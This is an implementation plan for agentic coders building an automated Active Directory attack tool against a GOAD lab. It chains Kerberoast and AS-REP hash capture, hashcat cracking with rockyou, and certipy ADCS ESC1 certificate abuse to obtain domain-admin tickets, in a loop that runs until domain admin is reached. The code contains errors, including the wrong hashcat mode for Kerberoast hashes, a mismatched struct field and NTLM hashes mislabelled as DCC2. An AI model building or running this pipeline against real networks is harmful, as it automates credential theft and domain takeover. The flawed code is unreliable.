# Offensive Closure Stage 1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement Stage 1 of the offensive closure layer — bounded recursion in privesc.go, hash capture + cracking pipeline, ADCS exploitation executor, phase status fix.

**Architecture:** privesc.go becomes the local convergence controller with a bounded loop (max 5 iterations) that re-runs the full privesc pipeline when new credentials are materialized. Hash capture parsers extract hashes from tool stdout at the dispatch boundary. A root-level cracking pipeline (HashQueue → CrackWorker → CredentialMaterializer) processes hashes asynchronously. ADCS becomes a two-stage capability family (CERT_ENROLL + PKINIT_AUTH). Phase status gets truthful Failed/Skipped semantics with reason codes.

**Tech Stack:** Go, hashcat (external), certipy (external), SQLite state DB, existing capability registry + executor dispatch

---

## File Structure

```
internal/cracker/
  queue.go          — HashQueue (thread-safe, dedup, priority tiers, backpressure)
  worker.go         — CrackWorker (goroutine, hashcat launch, --show polling)
  materializer.go   — CredentialMaterializer (dedup, validation, state injection)
  types.go          — shared types (CrackJob, CrackEvent, priority enum)

internal/executorbackend/adcs/
  executor.go       — shared types, CanExecute (staleness guard, certipy check)
  enroll.go         — ADCS_CERT_ENROLL executor (certipy-request)
  auth.go           — ADCS_PKINIT_AUTH executor (certipy-auth → TGT)
  executor_test.go  — tests

modules/
  executor_dispatch.go    — add hash parsers (ParseKerberoastOutput, ParseASREPOutput)
  executor_dispatch_test.go — hash parser tests
  privesc.go              — bounded recursion loop (5 iterations, delta classification)
  reconcile.go            — ADCS verification

cmd/
  autorun.go              — phase status fix (Failed vs Skipped, reason codes)
  root.go                 — cracker lifecycle, ADCS executor registration

core/
  capability.go           — ADCS_CERT_ENROLL, ADCS_PKINIT_AUTH entries
  state.go                — Credential metadata fields (SourceTool, TargetAccount, etc.)
  cracker.go              — CrackEventBus type, event types

tui/
  model.go                — display PhaseFailed vs PhaseSkipped with reason
```

---

### Task 1: Phase Status Fix

**Files:**
- Modify: `cmd/autorun.go:280-315`
- Modify: `tui/model.go:380-390`

- [ ] **Step 1: Read current phase status handling in cmd/autorun.go**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && grep -n 'PhaseSkipped\|PhaseFailed\|skipFail' cmd/autorun.go`
Identify where `skipFail` mode rewrites failed status.

- [ ] **Step 2: Add reason code type to core/state.go**

Add to `core/state.go`:
```go
type SkipReason string
const (
    SkipNoCreds       SkipReason = "NO_CREDS"
    SkipNoSession     SkipReason = "NO_SESSION"
    SkipNoPath        SkipReason = "NO_PATH"
    SkipNoDCSyncRights SkipReason = "NO_DCSYNC_RIGHTS"
    SkipNoSystemContext SkipReason = "NO_SYSTEM_CONTEXT"
)
```
Also add `SkipReason` field to phase status storage.

- [ ] **Step 3: Fix autorun.go — preserve PhaseFailed on failure**

In `cmd/autorun.go`, change the `skipFail` path:
```go
if !skipFail {
    status = core.PhaseUntouched
    ...
    break
}
// Keep PhaseFailed when --skip-fail is set; do NOT rewrite to PhaseSkipped
// PhaseSkipped is for planner decisions, not failure fallback.
```

- [ ] **Step 4: Update tui/model.go to display reason codes**

Add skip reason display to the status view:
```go
if status == core.PhaseSkipped {
    // show skip reason if available
}
```

- [ ] **Step 5: Build and test**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go build ./... && go test ./...`
Expected: Clean build, all tests pass.

- [ ] **Step 6: Commit**

```bash
cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack
git add cmd/autorun.go tui/model.go core/state.go
git commit -m "fix: phase status truthfulness — Failed vs Skipped with reason codes"
```

---

### Task 2: Credential Metadata Enrichment

**Files:**
- Modify: `core/state.go` (Credential struct)

- [ ] **Step 1: Read current Credential struct**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && grep -n 'type Credential struct' -A 20 core/state.go`

- [ ] **Step 2: Add metadata fields**

Add to `core.Credential`:
```go
SourceTool   string  `json:"source_tool" db:"source_tool"`
TargetAccount string `json:"target_account" db:"target_account"`
Confidence   float64 `json:"confidence" db:"confidence"`
```

Also add `CredHash` constant if not present:
```go
const CredHash = "hash"
```

- [ ] **Step 3: Add DB migration for new columns**

Add columns to `storage/db.go`:
```sql
ALTER TABLE credentials ADD COLUMN source_tool TEXT DEFAULT '';
ALTER TABLE credentials ADD COLUMN target_account TEXT DEFAULT '';
ALTER TABLE credentials ADD COLUMN confidence REAL DEFAULT 0.0;
```

- [ ] **Step 4: Update SaveCred/LoadCred in storage/repo_state.go**

Read and update the upsert SQL to include the new columns.

- [ ] **Step 5: Build and test**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go build ./... && go test ./storage/...`
Expected: Clean build, storage tests pass.

- [ ] **Step 6: Commit**

```bash
git add core/state.go storage/db.go storage/repo_state.go
git commit -m "feat: credential metadata — SourceTool, TargetAccount, Confidence"
```

---

### Task 3: Kerberoast / AS-REP Hash Capture

**Files:**
- Modify: `modules/executor_dispatch.go`
- Create: `modules/executor_dispatch_test.go` (if not exists)
- Modify: `modules/reconcile.go` (hash cred integration)

- [ ] **Step 1: Read current dispatch tool code**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && grep -n 'kerberoast\|asrep\|GetUserSPNs\|GetNPUsers' modules/executor_dispatch.go`

- [ ] **Step 2: Write hash parser regex tests**

Add to `modules/executor_dispatch_test.go`:
```go
func TestParseKerberoastOutput(t *testing.T) {
    tests := []struct {
        name string
        out  string
        want int // expected hash count
    }{
        {"single TGS hash", "$krb5tgs$23$*user$domain...", 1},
        {"no hash in output", "Impacket...\nNo SPNs found", 0},
        {"mixed stdout noise", "...noise...$krb5tgs$23$*...", 1},
        {"duplicate hashes", "$krb5tgs$23$*same...\n$krb5tgs$23$*same...", 1},
    }
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            got := ParseKerberoastOutput(tt.out)
            if len(got) != tt.want {
                t.Errorf("got %d hashes, want %d", len(got), tt.want)
            }
        })
    }
}

func TestParseASREPOutput(t *testing.T) {
    // same pattern for $krb5asrep$23$* hashes
}

func TestParseNTLMOutput(t *testing.T) {
    tests := []struct {
        name string
        out  string
        want int // expected hash count
    }{
        {"single DCC2 hash", "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", 0},
        {"real NTLM hash", "lewis:1001:aad3b435b51404eeaad3b435b51404ee:3f4b4e2b9c8f3a1d2e5f6a7b8c9d0e1f:::", 1},
        {"no hash in output", "Impacket v0.12...\n[*] Dumping local SAM info", 0},
        {"multiple users", "user1:1111:...:hash1:::\nuser2:1112:...:hash2:::", 2},
        {"duplicate hashes", "same:1111:...:hash1:::\nsame2:1112:...:hash1:::", 1},
    }
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            got := ParseNTLMOutput(tt.out)
            if len(got) != tt.want {
                t.Errorf("got %d hashes, want %d", len(got), tt.want)
            }
        })
    }
}
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go test ./modules/ -run 'TestParseKerberoastOutput|TestParseASREPOutput' -v`
Expected: Compile errors (functions not defined).

- [ ] **Step 4: Implement ParseKerberoastOutput**

Add to `modules/executor_dispatch.go`:
```go
var krb5tgsRe = regexp.MustCompile(`(?m)^\$krb5tgs\$23\$[*].*$`)

// ParseKerberoastOutput extracts $krb5tgs$23$ hashes from impacket-GetUserSPNs stdout.
func ParseKerberoastOutput(stdout string) []HashCred {
    matches := krb5tgsRe.FindAllString(stdout, -1)
    seen := make(map[string]bool)
    var out []HashCred
    for _, m := range matches {
        if seen[m] {
            continue
        }
        seen[m] = true
        out = append(out, HashCred{Hash: m, Type: "krb5tgs"})
    }
    return out
}
```

Also add the `HashCred` type:
```go
type HashCred struct {
    HashType string `json:"hash_type"` // "krb5tgs", "krb5asrep", "ntlm"
    Hash     string `json:"hash"`
    Username string `json:"username,omitempty"`
    Domain   string `json:"domain,omitempty"`
}
```

- [ ] **Step 5: Implement ParseASREPOutput**

Same pattern with `$krb5asrep$23$` regex.

- [ ] **Step 5b: Implement ParseNTLMOutput**

Add regex for impacket-secretsdump output (DCC2 hashes):
```go
var ntlmRe = regexp.MustCompile(`(?m)^[^:\n]+:[^:\n]*:[0-9]+:([a-f0-9]{32}):::`)

func ParseNTLMOutput(stdout string) []HashCred {
    // Lines: USER:UID:LMHASH:NTHASH:::
    // Skip NTLMSTUB (aad3b435...); only keep real hashes where NTHASH != 31d6cfe0...
    lines := strings.Split(stdout, "\n")
    seen := make(map[string]bool)
    var out []HashCred
    for _, line := range lines {
        if !strings.Contains(line, ":::") {
            continue
        }
        parts := strings.SplitN(line, ":", 4)
        if len(parts) < 4 {
            continue
        }
        username := parts[0]
        ridHash := parts[2]
        nthash := parts[3]
        if idx := strings.Index(nthash, ":"); idx > 0 {
            nthash = nthash[:idx]
        }
        // Skip NTLMSTUB or empty
        if nthash == "aad3b435b51404eeaad3b435b51404ee" || nthash == "31d6cfe0d16ae931b73c59d7e0c089c0" {
            continue
        }
        if seen[nthash] {
            continue
        }
        seen[nthash] = true
        out = append(out, HashCred{
            HashType: "ntlm",
            Hash:     nthash,
            Username: username,
        })
    }
    return out
}
```

- [ ] **Step 6: Wire hash parsing into dispatchTool return**

After each kerberoast/asrep command execution, call the parser and append results:
```go
case strings.Contains(capLower, "kerberoast"):
    cmd := exec.CommandContext(ctx, "impacket-GetUserSPNs", args...)
    hashes := ParseKerberoastOutput(result.Stdout)
    // Store hashes in result.Creds for the reconcile layer
```
Note: When crack queue is available (Task 8), also call `crackQueue.Enqueue(...)` here for each extracted hash.

- [ ] **Step 7: Update reconcile.go to store hash creds**

In `ReconcileCrossCheck`, check for hash-type creds and pass them through to state.

- [ ] **Step 8: Run hash parser tests**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go test ./modules/ -run 'TestParseKerberoastOutput|TestParseASREPOutput' -v`
Expected: All pass.

- [ ] **Step 9: Build and run full test suite**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go build ./... && go test ./...`
Expected: Clean build, all tests pass.

- [ ] **Step 10: Commit**

```bash
git add modules/executor_dispatch.go modules/executor_dispatch_test.go modules/reconcile.go
git commit -m "feat: extract kerberoast/ASREP hashes from tool stdout into state"
```

---

### Task 4: Cracking Pipeline — Types and Queue

**Files:**
- Create: `internal/cracker/types.go`
- Create: `internal/cracker/queue.go`

- [ ] **Step 1: Write types.go**

```go
package cracker

import "time"

type HashType string
const (
    HashKRB5TGS  HashType = "krb5tgs"
    HashKRB5ASREP HashType = "krb5asrep"
    HashNTLM     HashType = "ntlm"
)

type Priority int
const (
    PriorityDA          Priority = 1
    PrioritySPN         Priority = 2
    PriorityServiceAcct Priority = 3
    PrioritySessionUser Priority = 4
    PriorityOther       Priority = 5
)

type CrackJob struct {
    HashType HashType
    Hash     string
    Username string
    Domain   string
    Priority Priority
    Enqueued time.Time
}

type CrackEvent struct {
    Type    string // "hash_enqueued", "crack_progress", "crack_complete"
    Job     *CrackJob
    Result  string // cracked password (empty if not cracked)
    Error   error
}
```

- [ ] **Step 2: Write queue.go**

```go
package cracker

import (
    "sync"
    "time"
)

const (
    MaxQueueDepth   = 10000
    DedupTTL        = 30 * time.Minute
    RateLimitPerType = 10 // max hashes per second per type
)

type HashQueue struct {
    mu       sync.Mutex
    items    []*CrackJob
    seen     map[string]time.Time  // hash → enqueue time
    rateLim  map[HashType]int      // per-type counter
    events   chan CrackEvent
}

func NewHashQueue() *HashQueue { ... }
func (q *HashQueue) Enqueue(job *CrackJob) error { ... } // dedup + backpressure
func (q *HashQueue) Dequeue() *CrackJob { ... } // priority-ordered
func (q *HashQueue) Events() chan CrackEvent { ... }
```

Implement Enqueue with:
- Dedup by hash value (check `seen` map with TTL)
- Priority ordering (lower Priority number = higher priority)
- Backpressure (return error if queue depth > MaxQueueDepth)
- Rate limiting per hash type

- [ ] **Step 3: Write queue tests**

Create `internal/cracker/queue_test.go`:
```go
func TestHashQueueDedup(t *testing.T) {
    q := NewHashQueue()
    job := &CrackJob{HashType: HashKRB5TGS, Hash: "same-hash"}
    q.Enqueue(job)
    q.Enqueue(job) // same hash
    if len(q.items) != 1 {
        t.Errorf("expected 1 item, got %d", len(q.items))
    }
}
```

- [ ] **Step 4: Build and test**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go build ./internal/cracker/... && go test ./internal/cracker/...`
Expected: Clean build, tests pass.

- [ ] **Step 5: Commit**

```bash
git add internal/cracker/
git commit -m "feat: cracking pipeline — HashQueue with dedup, priority, backpressure"
```

---

### Task 5: Cracking Pipeline — Worker and Materializer

**Files:**
- Create: `internal/cracker/worker.go`
- Create: `internal/cracker/materializer.go`

- [ ] **Step 1: Write worker.go**

```go
package cracker

import (
    "os/exec"
    "time"
)

type CrackWorker struct {
    queue    *HashQueue
    hashcat  string // path to hashcat binary
    wordlist string // path to wordlist
}

func NewCrackWorker(queue *HashQueue, hashcatPath, wordlistPath string) *CrackWorker { ... }

func (w *CrackWorker) Run() {
    for {
        job := w.queue.Dequeue()
        if job == nil {
            time.Sleep(time.Second)
            continue
        }
        // 1. Write hash to temp file
        // 2. Determine hashcat mode (-m 18200 for krb5tgs, -m 18200 for krb5asrep, -m 1000 for NTLM)
        // 3. Launch hashcat with timeout (default 60s)
        // 4. Poll hashcat --show every 5s
        // 5. If cracked, emit CrackEvent
    }
}

func hashcatMode(ht HashType) string {
    switch ht {
    case HashKRB5TGS:
        return "18200"
    case HashKRB5ASREP:
        return "18200"
    case HashNTLM:
        return "1000"
    }
    return ""
}
```

- [ ] **Step 2: Write materializer.go**

```go
package cracker

type CredentialMaterializer struct {
    queue     *HashQueue
    onCracked func(cred CrackedCredential) // callback to inject into state
}

type CrackedCredential struct {
    Username string
    Domain   string
    Secret   string // cracked plaintext
    Hash     string // original hash
    HashType HashType
}

func NewCredentialMaterializer(queue *HashQueue, onCracked func(CrackedCredential)) *CredentialMaterializer { ... }

func (m *CredentialMaterializer) Run() {
    for event := range m.queue.Events() {
        if event.Type != "crack_complete" || event.Result == "" {
            continue
        }
        // 1. Build CrackedCredential
        // 2. Hash dedup + identity dedup
        // 3. Call onCracked callback
    }
}
```

- [ ] **Step 3: Write worker + materializer tests**

Test crack completion flow, dedup, empty results.

- [ ] **Step 4: Build and test**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go build ./internal/cracker/... && go test ./internal/cracker/...`
Expected: Clean build, tests pass.

- [ ] **Step 5: Commit**

```bash
git add internal/cracker/
git commit -m "feat: cracking pipeline — CrackWorker + CredentialMaterializer"
```

---

### Task 6: ADCS Executor — Capability Family

**Files:**
- Create: `internal/executorbackend/adcs/executor.go`
- Create: `internal/executorbackend/adcs/enroll.go`
- Create: `internal/executorbackend/adcs/auth.go`
- Create: `internal/executorbackend/adcs/executor_test.go`
- Modify: `core/capability.go`
- Modify: `cmd/root.go`
- Modify: `modules/executor_dispatch.go`
- Modify: `modules/reconcile.go`

- [ ] **Step 1: Read existing executor patterns**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && cat internal/executorbackend/dcsync/executor.go`

- [ ] **Step 2: Write shared executor.go**

```go
package adcs

import (
    "context"
    "time"
    "adpack/core"
    "adpack/utils"
)

const (
    CERT_ENROLL  core.Capability = "ADCS_CERT_ENROLL"
    PKINIT_AUTH  core.Capability = "ADCS_PKINIT_AUTH"
)

// Edge staleness TTL — if edge.ObservedAt is older than this, force re-detection.
const EdgeStalenessTTL = 5 * time.Minute

func certipyAvailable() bool {
    _, err := utils.FindTool("certipy")
    return err == nil
}

func isEdgeStale(e core.PrivilegeEdge) bool {
    if e.ObservedAt.IsZero() {
        return true
    }
    return time.Since(e.ObservedAt) > EdgeStalenessTTL
}
```

- [ ] **Step 3: Write enroll.go — ADCS_CERT_ENROLL executor**

```go
type CertEnrollExecutor struct{}

func (e *CertEnrollExecutor) Capability() core.Capability { return CERT_ENROLL }

func (e *CertEnrollExecutor) CanExecute(ctx context.Context, edge core.PrivilegeEdge, state *core.ADState) bool {
    if !certipyAvailable() { return false }
    if isEdgeStale(edge) { return false }
    // Enrollee must have enrollment rights (edge precondition)
    // Template must be in edge metadata
    return edge.SourcePrincipal != "" && edge.TargetPrincipal != ""
}

func (e *CertEnrollExecutor) Execute(ctx context.Context, edge core.PrivilegeEdge, state *core.ADState) core.ExecutionResult {
    // certipy-request -u ENROLLEE -p PASS -ca CA -template VULN_TEMPLATE -upn DA_TARGET
    // Return ExecutionResult with derived edges or error
}
```

- [ ] **Step 4: Write auth.go — ADCS_PKINIT_AUTH executor**

```go
type PKINITAuthExecutor struct{}

func (e *PKINITAuthExecutor) Capability() core.Capability { return PKINIT_AUTH }

func (e *PKINITAuthExecutor) CanExecute(ctx context.Context, edge core.PrivilegeEdge, state *core.ADState) bool {
    if !certipyAvailable() { return false }
    // A .pfx certificate must exist from prior enrollment step
    return edge.Metadata != nil
}

func (e *PKINITAuthExecutor) Execute(ctx context.Context, edge core.PrivilegeEdge, state *core.ADState) core.ExecutionResult {
    // certipy-auth -pfx cert.pfx -domain DOMAIN -dc-ip DC
    // Validate TGT → store DA credential
}
```

- [ ] **Step 5: Register in core/capability.go**

Add to `AccessRightToCapability`:
```go
case "ADCS_ESC1", "ADCS_ESC13":
    return ADCS_CERT_ENROLL
```

- [ ] **Step 6: Register in cmd/root.go**

```go
import "adpack/internal/executorbackend/adcs"
registry.Register(&adcs.CertEnrollExecutor{})
registry.Register(&adcs.PKINITAuthExecutor{})
```

- [ ] **Step 7: Write executor tests**

Test CanExecute with:
- certipy available/not available
- stale vs fresh edge
- valid enrollment rights

- [ ] **Step 8: Build and test**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go build ./... && go test ./internal/executorbackend/...`
Expected: Clean build, executor tests pass.

- [ ] **Step 9: Commit**

```bash
git add internal/executorbackend/adcs/ core/capability.go cmd/root.go modules/executor_dispatch.go modules/reconcile.go
git commit -m "feat: ADCS exploitation executor — CERT_ENROLL + PKINIT_AUTH capability family"
```

---

### Task 7: Bounded Recursion in privesc.go

**Files:**
- Modify: `modules/privesc.go`
- Modify: `modules/executor_dispatch.go`

- [ ] **Step 1: Read current RunPrivesc implementation**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && grep -n 'func RunPrivesc\|func ExecuteBestPaths\|func ExecutePlannedPath' modules/privesc.go`

- [ ] **Step 2: Add delta classification type**

```go
type DeltaClass int
const (
    DeltaNone        DeltaClass = iota
    DeltaCredential
    DeltaEdge
    DeltaPath
    DeltaNoise
)
```

- [ ] **Step 3: Implement convergence loop in RunPrivesc**

Wrap the existing privesc body in a bounded loop:

```go
func RunPrivesc(state *core.ADState, targetHost string, ...) *core.ToolResult {
    maxIter := 5
    for iter := 0; iter < maxIter; iter++ {
        credsBefore := len(state.Creds)
        edgesBefore := len(state.Edges)

        // Run full privesc detection pipeline
        // (existing code: ADCS, delegation, BH, ACL, etc.)

        // Score paths
        plans := planner.PlanPaths(...)

        // Execute best paths
        executeBestPaths(...)

        // Classify delta
        delta := classifyDelta(credsBefore, edgesBefore, state, plans)

        // Log iteration
        logIteration(iter, delta, state)

        // Check convergence
        switch delta {
        case DeltaNone, DeltaNoise:
            return result // converged
        case DeltaCredential:
            if hasValidatedDA(state) {
                return result // goal achieved
            }
            // continue to next iteration
        }
    }
    return result
}
```

- [ ] **Step 4: Implement delta classification**

```go
func classifyDelta(credsBefore, edgesBefore int, state *core.ADState, plans []planner.ScoredPath) DeltaClass {
    if len(state.Creds) > credsBefore {
        return DeltaCredential
    }
    if len(state.Edges) > edgesBefore {
        return DeltaEdge
    }
    // Check if best path to DA shortened
    if len(plans) > 0 {
        // compare to previous best path cost
    }
    return DeltaNoise
}
```

- [ ] **Step 5: Implement iteration logging**

Structured diff-based log output for each iteration.

- [ ] **Step 5b: Add dispatch invocation guard**

In `modules/executor_dispatch.go`, add a guard that panics if an executor is invoked through any path other than the capability registry:

```go
func guardCapabilityDispatch(toolName string, invokedBy string) {
    // If invokedBy is empty or not from the registry, this is a bypass.
    if invokedBy != "capability_registry" {
        log.Fatalf("FATAL: executor %q invoked outside capability registry (route: %s). This would desync planner state. Fix the caller.", toolName, invokedBy)
    }
}
```

Call this at the top of every dispatch case branch when an executor action is about to execute.

- [ ] **Step 6: Build and test**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go build ./... && go test ./modules/...`
Expected: Clean build, modules tests pass.

- [ ] **Step 7: Commit**

```bash
git add modules/privesc.go
git commit -m "feat: bounded recursion in privesc — 5-iteration convergence loop with delta classification"
```

---

### Task 8: Wire Everything Together

**Files:**
- Modify: `cmd/root.go` (cracker lifecycle)

- [ ] **Step 1: Spawn cracker in root.go**

```go
import "adpack/internal/cracker"

var (
    crackQueue    *cracker.HashQueue
    crackWorker   *cracker.CrackWorker
)

func initCracker() {
    crackQueue = cracker.NewHashQueue()
    crackWorker = cracker.NewCrackWorker(crackQueue, "/usr/bin/hashcat", "/usr/share/wordlists/rockyou.txt")
    go crackWorker.Run()
    materializer := cracker.NewCredentialMaterializer(crackQueue, func(cred cracker.CrackedCredential) {
        // Inject into state
        // Emit event for privesc loop
    })
    go materializer.Run()
}
```

- [ ] **Step 2: Connect hash extraction → crack queue**

In the dispatch hash parser (Task 3), enqueue extracted hashes into the crack queue.

- [ ] **Step 3: Connect materializer → privesc interrupt**

When a crack completes, set a flag that the privesc recursion loop checks:
```go
var pendingCrackedCreds []cracker.CrackedCredential
```

- [ ] **Step 4: Build and test**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && go build ./... && go test ./...`
Expected: Clean build, all tests pass.

- [ ] **Step 5: Final autorun against GOAD-Light**

Run: `cd /mnt/c/Users/lewis/Desktop/goad-workspace/adpack && rm -f ~/.adpack/state.db && go build -o /tmp/adpack . && bash tmp_autorun.sh 2>&1 | tee /tmp/final_autorun.log`
Expected: All 9 phases complete, BloodHound ingested, hashes captured, ADCS exploitation attempted.

- [ ] **Step 6: Commit**

```bash
git add cmd/root.go
git commit -m "feat: wire cracker pipeline into root lifecycle — hash queue → worker → materializer → privesc interrupt"
```
